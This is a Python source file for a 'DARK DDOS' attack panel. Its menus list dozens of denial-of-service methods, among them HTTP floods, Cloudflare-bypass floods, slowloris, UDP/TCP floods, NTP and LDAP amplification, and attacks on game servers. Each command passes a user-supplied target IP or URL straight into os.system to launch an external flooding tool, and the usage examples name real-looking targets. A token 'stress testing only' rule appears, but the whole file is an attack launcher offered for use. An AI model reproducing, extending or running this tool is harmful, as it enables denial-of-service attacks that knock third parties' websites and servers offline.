##############################
# DARK DDOS Made by @darkofmaster #
##############################

import socket
import os
import requests
import random
import getpass
import time
import sys

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

proxys = open('proxies.txt').readlines()
bots = len(proxys)

def fetching_animation():
    frames = [
        "\033[91m[■□□□□□□□□□] 0%  \033[0m",
        "\033[93m[■■□□□□□□□□] 10% \033[0m",
        "\033[93m[■■■□□□□□□□] 20% \033[0m",
        "\033[93m[■■■■□□□□□□] 30% \033[0m",
        "\033[92m[■■■■■□□□□□] 40% \033[0m",
        "\033[92m[■■■■■■□□□□] 50% \033[0m",
        "\033[92m[■■■■■■■□□□] 60% \033[0m",
        "\033[94m[■■■■■■■■□□] 70% \033[0m",
        "\033[94m[■■■■■■■■■□] 80% \033[0m",
        "\033[94m[■■■■■■■■■■] 90% \033[0m",
        "\033[95m[■■■■■■■■■■] 100%\033[0m"
    ]
    for frame in frames:
        sys.stdout.write("\r" + "\033[92m[FETCHING] \033[0m" + frame)
        sys.stdout.flush()
        time.sleep(0.15)
    print("\n")

def top_frame():
    print("")
    print(" " * 12 + "\033[91m╔═══════════════════════════════════════════════════╗\033[0m")
    print(" " * 12 + "\033[91m║              DARK DDOS - @darkofmaster           ║\033[0m")
    print(" " * 12 + "\033[91m╚═══════════════════════════════════════════════════╝\033[0m")

def section_header(title):
    print("")
    print(" " * 16 + "\033[91m┌─────────────────────────────────────┐\033[0m")
    print(" " * 16 + f"\033[91m│          {title:^25s}       │\033[0m")
    print(" " * 16 + "\033[91m└─────────────────────────────────────┘\033[0m")

def menu_box(items):
    print(" " * 12 + "\033[91m┌──────────────────────┬──────────────────────┐\033[0m")
    for i in range(0, len(items), 2):
        left = items[i] if i < len(items) else ""
        right = items[i+1] if i+1 < len(items) else ""
        if left and right:
            print(" " * 12 + f"\033[91m│  \033[92m{left:<18}\033[91m│  \033[92m{right:<18}\033[91m│\033[0m")
        elif left:
            print(" " * 12 + f"\033[91m│  \033[92m{left:<18}\033[91m│  {'':<20}│\033[0m")
    print(" " * 12 + "\033[91m└──────────────────────┴──────────────────────┘\033[0m")

def ascii_vro():
    clear()
    print("""\033[91m
    ██████╗ ██╗   ██╗██╗     ███╗   ██╗███████╗██████╗ ███████╗██████╗ 
    ██╔══██╗██║   ██║██║     ████╗  ██║██╔════╝██╔══██╗██╔════╝██╔══██╗
    ██████╔╝██║   ██║██║     ██╔██╗ ██║█████╗  ██████╔╝█████╗  ██████╔╝
    ██╔══██╗██║   ██║██║     ██║╚██╗██║██╔══╝  ██╔══██╗██╔══╝  ██╔══██╗
    ██████╔╝╚██████╔╝███████╗██║ ╚████║███████╗██║  ██║███████╗██║  ██║
    ╚═════╝  ╚═════╝ ╚══════╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
    \033[0m""")
    print(" " * 28 + "\033[91m[ DARK OF MASTER BLACKHAT HACKER ]\033[0m")
    time.sleep(1)
    clear()

def si():
    print("")
    print('\033[91m[ \033[92mDARK \033[91m] | \033[97m> WELCOME TO DARK OF MASTER SERVER! \033[91m| \033[97mOWNER: @darkofmaster \033[91m| \033[97mUPDATE V1.1\033[0m')
    print("")

def tools():
    clear()
    fetching_animation()
    si()
    top_frame()
    section_header("TOOLS")
    menu_box(["GEOIP", "REVERSE-DNS", "REVERSEIP", "", "SUBNET-LOOKUP", "", "ASN-LOOKUP", "", "DNS-LOOKUP", ""])

def banners():
    clear()
    fetching_animation()
    si()
    top_frame()
    section_header("BANNERS")
    menu_box(["TROLL", "", "PIKACHU", ""])

def rules():
    clear()
    fetching_animation()
    si()
    top_frame()
    print("")
    print(" " * 12 + "\033[91m┌──────────────────────────────────────────────────┐\033[0m")
    print(" " * 12 + "\033[91m│                \033[92mRULES\033[91m                              │\033[0m")
    print(" " * 12 + "\033[91m├──────────────────────────────────────────────────┤\033[0m")
    print(" " * 12 + f"\033[91m│ \033[92m2. DO NOT ATTACK .GOV/.GOB/.EDU/.MIL DOMAINS   \033[91m│\033[0m")
    print(" " * 12 + f"\033[91m│ \033[92m4. ONLY ATTACK STRESS TESTING SERVERS          \033[91m│\033[0m")
    print(" " * 12 + f"\033[91m│ \033[92m5. DON'T SKID THE PANEL                        \033[91m│\033[0m")
    print(" " * 12 + f"\033[91m│ \033[92m6. GIVE A STAR TO THE GITHUB REPOSITORY        \033[91m│\033[0m")
    print(" " * 12 + f"\033[91m│ \033[92m7. THE CREATOR DOES NOT DO ANY HARM            \033[91m│\033[0m")
    print(" " * 12 + "\033[91m└──────────────────────────────────────────────────┘\033[0m")

def ports():
    clear()
    fetching_animation()
    si()
    top_frame()
    section_header("PORTS")
    print(" " * 12 + "\033[91m┌──────────────────────────────────────────────────┐\033[0m")
    print(" " * 12 + f"\033[91m│ \033[92m21\033[97m - SFTP      \033[92m69\033[97m  - TFTP     \033[92m5060\033[97m - RIP     \033[91m│\033[0m")
    print(" " * 12 + f"\033[91m│ \033[92m22\033[97m - SSH       \033[92m80\033[97m  - HTTP     \033[92m30120\033[97m - FIVEM   \033[91m│\033[0m")
    print(" " * 12 + f"\033[91m│ \033[92m23\033[97m - TELNET    \033[92m443\033[97m - HTTPS              \033[91m│\033[0m")
    print(" " * 12 + f"\033[91m│ \033[92m25\033[97m - SMTP      \033[92m3074\033[97m - XBOX               \033[91m│\033[0m")
    print(" " * 12 + f"\033[91m│ \033[92m53\033[97m - DNS       \033[92m5060\033[97m - PLAYSATION          \033[91m│\033[0m")
    print(" " * 12 + f"\033[91m│ \033[92m25565\033[97m - MINECRAFT           \033[91m│\033[0m")
    print(" " * 12 + "\033[91m└──────────────────────────────────────────────────┘\033[0m")

def special():
    clear()
    fetching_animation()
    si()
    top_frame()
    section_header("SPECIAL")
    menu_box(["STRESS", ""])

def layer7():
    clear()
    fetching_animation()
    si()
    top_frame()
    section_header("LAYER 7")
    menu_box(["HTTP-RAW", "CRASH", "HTTP-SOCKET", "HTTPFLOOD", "HTTP-STORM", "CF-SOCKET", "HTTP-RAND", "CF-PRO", "OVERFLOW", "HYPER", "CF-BYPASS", "SLOW", "UAMBYPASS", "HTTPS-SPOOF", "OVH-RAW", "OVH-BEAM"])

def layer4():
    clear()
    fetching_animation()
    si()
    top_frame()
    section_header("LAYER 4")
    menu_box(["UDP", "TCP", "NFO-KILLER", "STD", "UDPBYPASS", "DESTROY", "HOME", "GOD", "SLOWLORIS", "FLUX", "STDV2", ""])

def amp_games():
    clear()
    fetching_animation()
    si()
    top_frame()
    section_header("AMP / GAMES")
    menu_box(["OVH-AMP", "OVH-AMP", "MINECRAFT", "STD", "SAMP", "LDAP"])

def menu():
    sys.stdout.write(f"\033]2;DARK DDOS --> STARS: [{bots}] | ONLINE USERS: [1] | METHODS: [25] | BYPASS: [10] | AMPS: [1]\007")
    clear()
    fetching_animation()
    print('')
    print('\033[91m[ \033[92mDARK \033[91m] | \033[97mWELCOME TO DARK OF MASTER SERVER! \033[91m| \033[97mOWNER: @darkofmaster \033[91m| \033[97mUPDATE V1.1\033[0m')
    print("")
    print("""\033[91m
        ██████╗  █████╗ ██████╗ ██╗  ██╗    ██████╗ ██████╗  ██████╗ ███████╗
        ██╔══██╗██╔══██╗██╔══██╗██║ ██╔╝    ██╔══██╗██╔══██╗██╔═══██╗██╔════╝
        ██║  ██║███████║██████╔╝█████╔╝     ██║  ██║██║  ██║██║   ██║███████╗
        ██║  ██║██╔══██║██╔══██╗██╔═██╗     ██║  ██║██║  ██║██║   ██║╚════██║
        ██████╔╝██║  ██║██║  ██║██║  ██╗    ██████╔╝██████╔╝╚██████╔╝███████║
        ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝    ╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝
    \033[0m""")
    print(" " * 12 + "\033[91m┌──────────────────────────────────────────────────────┐\033[0m")
    print(" " * 12 + "\033[91m│            \033[97mWELCOME TO DARK DDOS PANEL\033[91m                │\033[0m")
    print(" " * 12 + "\033[91m│       \033[95m---------- \033[97mFREE DDOS PANEL 2022\033[91m----------       │\033[0m")
    print(" " * 12 + "\033[91m└──────────────────────────────────────────────────────┘\033[0m")
    print(" " * 16 + "\033[91m┌───────────────────────────────────────────────┐\033[0m")
    print(" " * 16 + "\033[91m│    \033[97mTYPE HELP TO SEE THE ALL COMMANDS.\033[91m          │\033[0m")
    print(" " * 16 + "\033[91m└───────────────────────────────────────────────┘\033[0m")
    print("")

def main():
    menu()
    while(True):
        cnc = input('''\033[91m╔══[\033[92mDARK\033[91m@\033[92mDDOS\033[91m]
\033[91m╚\033[92m═\033[91m═\033[92m═\033[91m═\033[92m═\033[91m➤ \033[97m''')
        if cnc == "layer7" or cnc == "LAYER7" or cnc == "L7" or cnc == "l7":
            layer7()
        elif cnc == "layer4" or cnc == "LAYER4" or cnc == "L4" or cnc == "l4":
            layer4()
        elif cnc == "amp" or cnc == "AMP" or cnc == "amp/game" or cnc == "amps/game" or cnc == "amps/games" or cnc == "amp/games" or cnc == "AMP/GAME":
            amp_games()
        elif cnc == "special" or cnc == "SPECIAL" or cnc == "specialS" or cnc == "SPECIALS":
            special()
        elif cnc == "rule" or cnc == "RULES" or cnc == "rules" or cnc == "RULES" or cnc == "RULE34":
            rules()
        elif cnc == "clear" or cnc == "CLEAR" or cnc == "CLS" or cnc == "cls":
            main()
        elif cnc == "ports" or cnc == "port" or cnc == "PORTS" or cnc == "PORT":
            ports()
        elif cnc == "tools" or cnc == "tool" or cnc == "TOOLS" or cnc == "TOOL":
            tools()
        elif cnc == "banner" or cnc == "BANNER" or cnc == "banners" or cnc == "BANNERS":
            banners()
   
        elif "udpbypass" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                os.system(f'./UDPBYPASS {ip} {port}')
            except IndexError:
                print('\033[92mUSAGE: UDPBYPASS <IP> <PORT>\033[0m')
                print('\033[92mEXAMPLE: UDPBYPASS 1.1.1.1 80\033[0m')

        elif "stdv2" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                os.system(f'./std {ip} {port}')
            except IndexError:
                print('\033[92mUSAGE: STDV2 <IP> <PORT>\033[0m')
                print('\033[92mEXAMPLE: STDV2 1.1.1.1 80\033[0m')

        elif "flux" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                thread = cnc.split()[3]
                os.system(f'./flux {ip} {port} {thread} 0')
            except IndexError:
                print('\033[92mUSAGE: FLUX <IP> <PORT> <THREADS>\033[0m')
                print('\033[92mEXAMPLE: FLUX 1.1.1.1 80 250\033[0m')

        elif "slowloris" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                os.system(f'./slowloris {ip} {port}')
            except IndexError:
                print('\033[92mUSAGE: SLOWLORIS <IP> <PORT>\033[0m')
                print('\033[92mEXAMPLE: SLOWLORIS 1.1.1.1 80\033[0m')

        elif "god" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                time = cnc.split()[3]
                os.system(f'perl god.pl {ip} {port} 65500 {time}')
            except IndexError:
                print('\033[92mUSAGE: GOD <IP> <PORT> <TIME>\033[0m')
                print('\033[92mEXAMPLE: GOD 1.1.1.1 80 60\033[0m')

        elif "destroy" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                time = cnc.split()[3]
                os.system(f'perl destroy.pl {ip} {port} 65500 {time}')
            except IndexError:
                print('\033[92mUSAGE: DESTROY <IP> <PORT> <TIME>\033[0m')
                print('\033[92mEXAMPLE: DESTROY 1.1.1.1 80 60\033[0m')

        elif "std" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                os.system(f'./STD-NOSPOOF {ip} {port}')
            except IndexError:
                print('\033[92mUSAGE: STD <IP> <PORT>\033[0m')
                print('\033[92mEXAMPLE: STD 1.1.1.1 80\033[0m')

        elif "home" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                psize = cnc.split()[3]
                time = cnc.split()[4]
                os.system(f'perl home.pl {ip} {port} {psize} {time}')
            except IndexError:
                print('\033[92mUSAGE: HOME <IP> <PORT> <PACKET_SIZE> <TIME>\033[0m')
                print('\033[92mEXAMPLE: HOME 1.1.1.1 80 65500 60\033[0m')

        elif "udp" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                os.system(f'python2 udp.py {ip} {port} 0 0')
            except IndexError:
                print('\033[92mUSAGE: UDP <IP> <PORT>\033[0m')
                print('\033[92mEXAMPLE: UDP 1.1.1.1 80\033[0m')

        elif "nfo-killer" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                threads = cnc.split()[3]
                time = cnc.split()[4]
                os.system(f'./nfo-killer {ip} {port} {threads} -1 {time}')
            except IndexError:
                print('\033[92mUSAGE: NFO-KILLER <IP> <PORT> <THREADS> <TIME>\033[0m')
                print('\033[92mEXAMPLE: NFO-KILLER 1.1.1.1 80 850 60\033[0m')

        elif "ovh-raw" in cnc:
            try:
                method = cnc.split()[1]
                ip = cnc.split()[2]
                port = cnc.split()[3]
                time = cnc.split()[4]
                conns = cnc.split()[5]
                os.system(f'./ovh-raw {method} {ip} {port} {time} {conns}')
            except IndexError:
                print('\033[92mUSAGE: OVH-RAW METHODS[GET/POST/HEAD] <IP> <PORT> <TIME> <CONNECTIONS>\033[0m')
                print('\033[92mEXAMPLE: OVH-RAW GET 1.1.1.1 80 60 8500\033[0m')

        elif "tcp" in cnc:
            try:
                method = cnc.split()[1]
                ip = cnc.split()[2]
                port = cnc.split()[3]
                time = cnc.split()[4]
                conns = cnc.split()[5]
                os.system(f'./100UP-TCP {method} {ip} {port} {time} {conns}')
            except IndexError:
                print('\033[92mUSAGE: TCP METHODS[GET/POST/HEAD] <IP> <PORT> <TIME> <CONNECTIONS>\033[0m')
                print('\033[92mEXAMPLE: TCP GET 1.1.1.1 80 60 8500\033[0m')

        # SPECIAL METHODS
        elif "stress" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                mode = cnc.split()[3]
                conn = cnc.split()[4]
                time = cnc.split()[5]
                out = cnc.split()[6]
                os.system(f'go run stress.go {ip} {port} {mode} {conn} {time} {out}')
            except IndexError:
                print('\033[92mUSAGE: STRESS <IP> <PORT> <MODE> <CONNECTION> <SECONDS> <TIMEOUT>\033[0m')
                print('\033[92mMODE: [1] TCP\033[0m')
                print('\033[92m      [2] UDP\033[0m')
                print('\033[92m      [3] HTTP\033[0m')
                print('\033[92mEXAMPLE: STRESS 1.1.1.1 80 3 1250 60 5\033[0m')
                
        elif "samp" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                os.system(f'python2 samp.py {ip} {port}')
            except IndexError:
                print('\033[92mUSAGE: SAMP <IP> <PORT>\033[0m')
                print('\033[92mEXAMPLE: SAMP 1.1.1.1 7777\033[0m')

        elif "ldap" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                thread = cnc.split()[3]
                time = cnc.split()[4]
                os.system(f'./ldap {ip} {port} {thread} -1 {time}')
            except IndexError:
                print('\033[92mUSAGE: LDAP <IP> <PORT> <THREADS> <TIME>\033[0m')
                print('\033[92mEXAMPLE: LDAP 1.1.1.1 80 650 60\033[0m')

        elif "minecraft" in cnc:
            try:
                ip = cnc.split()[1]
                throttle = cnc.split()[2]
                threads = cnc.split()[3]
                time = cnc.split()[4]
                os.system(f'./MINECRAFT-SLAM {ip} {threads} {time}')
            except IndexError:
                print('\033[92mUSAGE: MINECRAFT <IP> <THROTTLE> <THREADS> <TIME>\033[0m')
                print('\033[92mEXAMPLE: MINECRAFT 1.1.1.1 5000 500 60\033[0m')

        elif "ovh-amp" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                os.system(f'./OVH-AMP {ip} {port}')
            except IndexError:
                print('\033[92mUSAGE: OVH-AMP <IP> <PORT>\033[0m')
                print('\033[92mEXAMPLE: OVH-AMP 1.1.1.1 80\033[0m')
                
        elif "ntp" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                throttle = cnc.split()[3]
                time = cnc.split()[4]
                os.system(f'./ntp {ip} {port} ntp.txt {throttle} {time}')
            except IndexError:
                print('\033[92mUSAGE: NTP <IP> <PORT> <THROTTLE> <TIME>\033[0m')
                print('\033[92mEXAMPLE: NTP 1.1.1.1 22 250 60\033[0m')

        elif "ovh-beam" in cnc:
            try:
                method = cnc.split()[1]
                ip = cnc.split()[2]
                port = cnc.split()[3]
                time = cnc.split()[4] 
                os.system(f'./OVH-BEAM {method} {ip} {port} {time} 1024')
            except IndexError:
                print('\033[92mUSAGE: OVH-BEAM <GET/HEAD/POST/PUT> <IP> <PORT> <TIME>\033[0m')
                print('\033[92mEXAMPLE: OVH-BEAM GET 51.38.92.223 80 60\033[0m')
    
        elif "https-spoof" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                thread = cnc.split()[3]
                os.system(f'python3 https-spoof.py {url} {time} {thread}')
            except IndexError:
                print('\033[92mUSAGE: HTTPS-SPOOF <URL> <TIME> <THREADS>\033[0m')
                print('\033[92mEXAMPLE: HTTPS-SPOOF http://vailon.com 60 500\033[0m')
    
        elif "slow" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node slow.js {url} {time}')
            except IndexError:
                print('\033[92mUSAGE: SLOW <URL> <TIME>\033[0m')
                print('\033[92mEXAMPLE: SLOW http://vailon.com 60\033[0m')
    
        elif "hyper" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node hyper.js {url} {time}')
            except IndexError:
                print('\033[92mUSAGE: HYPER <URL> <TIME>\033[0m')
                print('\033[92mEXAMPLE: HYPER http://vailon.com 60\033[0m')
                
        elif "cf-socket" in cnc:
            print('\033[92mRUNNING CF-SOCKET...\033[0m')
            os.system(f'python3 bypass.py')
    
        elif "cf-pro" in cnc:
            print('\033[92mRUNNING CF-PRO...\033[0m')
            os.system(f'python3 cf-pro.py')
        
        elif "http-socket" in cnc:
            try:
                url = cnc.split()[1]
                per = cnc.split()[2]
                time = cnc.split()[3]
                os.system(f'node HTTP-SOCKET {url} {per} {time}')
            except IndexError:
                print('\033[92mUSAGE: HTTP-SOCKET <URL> <PER> <TIME>\033[0m')
                print('\033[92mEXAMPLE: HTTP-SOCKET http://example.com 5000 60\033[0m')

        elif "http-raw" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node HTTP-RAW {url} {time}')
            except IndexError:
                print('\033[92mUSAGE: HTTP-RAW <URL> <TIME>\033[0m')
                print('\033[92mEXAMPLE: HTTP-RAW http://example.com 60\033[0m')

        elif "http-requests" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node HTTP-REQUESTS {url} {time}')
            except IndexError:
                print('\033[92mUSAGE: HTTP-REQUESTS <URL> <TIME>\033[0m')
                print('\033[92mEXAMPLE: HTTP-REQUESTS http://example.org 60\033[0m')

        elif "http-rand" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node HTTP-RAND.js {url} {time}')
            except IndexError:
                print('\033[92mUSAGE: HTTP-RAND <URL> <TIME>\033[0m')
                print('\033[92mEXAMPLE: HTTP-RAND http://vailon.com/ 60\033[0m')

        elif "overflow" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                thread = cnc.split()[3]
                os.system(f'./OVERFLOW {ip} {port} {thread}')
            except IndexError:
                print('\033[92mUSAGE: OVERFLOW <IP> <PORT> <THREADS>\033[0m')
                print('\033[92mEXAMPLE: OVERFLOW 1.1.1.1 80 5000\033[0m')

        elif "cf-bypass" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                thread = cnc.split()[3]
                os.system(f'node cf.js {url} {time} {thread}')
            except IndexError:
                print('\033[92mUSAGE: CF-BYPASS <URL> <TIME> <THREADS>\033[0m')
                print('\033[92mEXAMPLE: CF-BYPASS http://example.com 60 1250\033[0m')

        elif "uambypass" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                per = cnc.split()[3]
                os.system(f'node uambypass.js {url} {time} {per} http.txt')
            except IndexError:
                print('\033[92mUSAGE: UAMBYPASS <URL> <TIME> <REQ_PER_IP>\033[0m')
                print('\033[92mEXAMPLE: UAMBYPASS http://example.com 60 1250\033[0m')

        elif "crash" in cnc:
            try:
                url = cnc.split()[1]
                method = cnc.split()[2]
                os.system(f'go run Hulk.go -site {url} -data {method}')
            except IndexError:
                print('\033[92mUSAGE: CRASH <URL> METHODS<GET/POST>\033[0m')
                print('\033[92mEXAMPLE: CRASH http://example.com GET\033[0m')

        elif "httpflood" in cnc:
            try:
                url = cnc.split()[1]
                thread = cnc.split()[2]
                method = cnc.split()[3]
                time = cnc.split()[4]
                os.system(f'go run httpflood.go {url} {thread} {method} {time} nil')
            except IndexError:
                print('\033[92mUSAGE: HTTPFLOOD <URL> <THREADS> METHODS<GET/POST> <TIME>\033[0m')
                print('\033[92mEXAMPLE: HTTPFLOOD http://example.com 15000 get 60\033[0m')

        elif "httpget" in cnc:
            try:
                url = cnc.split()[1]
                os.system(f'./httpget {url} 10000 50 100')
            except IndexError:
                print('\033[92mUSAGE: HTTPGET <URL>\033[0m')
                print('\033[92mEXAMPLE: HTTPGET http://example.com\033[0m')

        # BANNERS
        elif "troll" in cnc:
            print('\033[92m░░░░░▄▄▄▄▀▀▀▀▀▀▀▀▄▄▄▄▄▄░░░░░░░   \033[0m')
            print('\033[92m░░░░░█░░░░▒▒▒▒▒▒▒▒▒▒▒▒░░▀▀▄░░░░  \033[0m')
            print('\033[92m░░░░█░░░▒▒▒▒▒▒░░░░░░░░▒▒▒░░█░░░  \033[0m')
            print('\033[92m░░░█░░░░░░▄██▀▄▄░░░░░▄▄▄░░░░█░░  \033[0m')
            print('\033[92m░▄▀▒▄▄▄▒░█▀▀▀▀▄▄█░░░██▄▄█░░░░█░  \033[0m')
            print('\033[92m█░▒█▒▄░▀▄▄▄▀░░░░░░░░█░░░▒▒▒▒▒░█  \033[0m')
            print('\033[92m█░▒█░█▀▄▄░░░░░█▀░░░░▀▄░░▄▀▀▀▄▒█  \033[0m')
            print('\033[92m░█░▀▄░█▄░█▀▄▄░▀░▀▀░▄▄▀░░░░█░░█░  \033[0m')
            print('\033[92m░░█░░░▀▄▀█▄▄░█▀▀▀▄▄▄▄▀▀█▀██░█░░  \033[0m')
            print('\033[92m░░░█░░░░██░░▀█▄▄▄█▄▄█▄████░█░░░  \033[0m')
            print('\033[92m░░░░█░░░░▀▀▄░█░░░█░█▀██████░█░░  \033[0m')
            print('\033[92m░░░░░▀▄░░░░░▀▀▄▄▄█▄█▄█▄█▄▀░░█░░  \033[0m')
            print('\033[92m░░░░░░░▀▄▄░▒▒▒▒░░░░░░░░░░▒░░░█░  \033[0m')
            print('\033[92m░░░░░░░░░░▀▀▄▄░▒▒▒▒▒▒▒▒▒▒░░░░█░  \033[0m')
            print('\033[92m░░░░░░░░░░░░░░▀▄▄▄▄▄░░░░░░░░█░░  \033[0m')

        elif "pikachu" in cnc:
            print('\033[92m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  \033[0m')
            print('\033[92m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣿⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  \033[0m')
            print('\033[92m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  \033[0m')
            print('\033[92m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⠁⠀⠹⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  \033[0m')
            print('\033[92m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⡇⠀⠀⠀⢿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  \033[0m')
            print('\033[92m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  \033[0m')
            print('\033[92m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡏⠀⠀⠀⠀⣾⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  \033[0m')
            print('\033[92m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⠿⠃⠀⠀⠐⠚⠻⢷⣦⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  \033[0m')
            print('\033[92m⠀⠀⠀⠀⠀⠀⠀⠀⣠⡾⠿⣷⣦⡀⠀⠀⠀⠀⠀⠀⠀⣰⠟⢁⣀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  \033[0m')
            print('\033[92m⠀⠀⠀⠀⠀⠀⢠⣾⠟⠁⠀⠀⠙⢿⣦⣄⠀⠀⠀⠀⣼⠏⣼⣧⣼⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣷⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀  \033[0m')
            print('\033[92m⠀⠀⠀⠀⠀⣴⡿⠃⠀⠀⠀⠀⠀⠀⠉⠻⣷⣤⣤⡾⢿⠐⣿⡿⠃⠀⠀⠀⢀⡖⠒⣦⡀⠀⠀⠀⠀⠈⠙⠛⠷⣦⣄⡀⠀⠀⠀⠀⠀  \033[0m')
            print('\033[92m⠀⠀⠀⢠⣾⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⡿⠁⢸⠀⠀⣤⡄⠀⠀⠀⢸⣧⣤⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⣶⣄⠀⠀⠀  \033[0m')
            print('\033[92m⠀⠀⣰⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣇⡠⠃⠀⣀⡈⠀⠀⠀⠀⠘⢿⣿⣿⠟⠀⠀⠀⠀⠠⣄⠀⠀⠀⠀⠀⠈⢻⣷⣄⠀  \033[0m')
            print('\033[92m⠀⣰⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡇⠀⠀⢹⡟⠓⣶⠀⠀⠀⠀⣨⣤⣤⡀⠀⠀⠀⠀⢸⣿⣶⣦⣤⣶⣾⣿⣿⣿⣆  \033[0m')
            print('\033[92m⢠⣿⣷⣶⣶⣶⣶⣤⣤⣤⣤⣄⣀⡀⠀⠀⠀⠀⠘⣧⠀⠀⠈⣄⠀⡏⠀⠀⠀⢸⣿⣿⣿⣿⠀⠀⠀⠀⣸⡟⠀⠉⠙⠛⠛⠿⠿⠿⠛  \033[0m')
            print('\033[92m⠈⠉⠉⠉⠉⠉⠉⠉⠉⠉⣹⣿⠟⠋⠀⠀⣠⣴⡿⠿⣷⣄⠀⠈⠓⠁⠀⠀⠀⠈⠿⣿⡿⠏⠀⠀⠀⢀⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀  \033[0m')
            print('\033[92m⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⡟⠁⠀⠀⠀⢾⣿⣯⡀⠀⢸⡏⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠒⠛⠛⠿⣷⡄⠀⠀⠀⠀⠀⠀⠀⠀  \033[0m')
            print('\033[92m⠀⠀⠀⠀⠀⠀⠀⠀⠙⠛⠿⢿⣶⣦⣤⣀⠈⠙⢿⣶⣼⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⡇⠀⠀⠀⠀⠈⣿⡀⠀⠀⠀⠀⠀⠀⠀  \033[0m')
            print('\033[92m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⣿⡿⠃⣠⣿⢋⣽⣷⠀⠀⠀⠀⠉⠳⢦⡀⠀⠀⠀⠈⣧⠀⠀⠀⠀⠀⣿⡇⠀⠀⠀⠀⠀⠀⠀  \033[0m')
            print('\033[92m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣿⣷⣶⣿⣧⣾⣿⣿⡆⠀⠀⠀⠀⠀⠀⠹⣆⠀⠀⠀⠈⠻⢦⣤⣤⣴⡟⠀⠀⠀⠀⠀⠀⠀⠀  \033[0m')
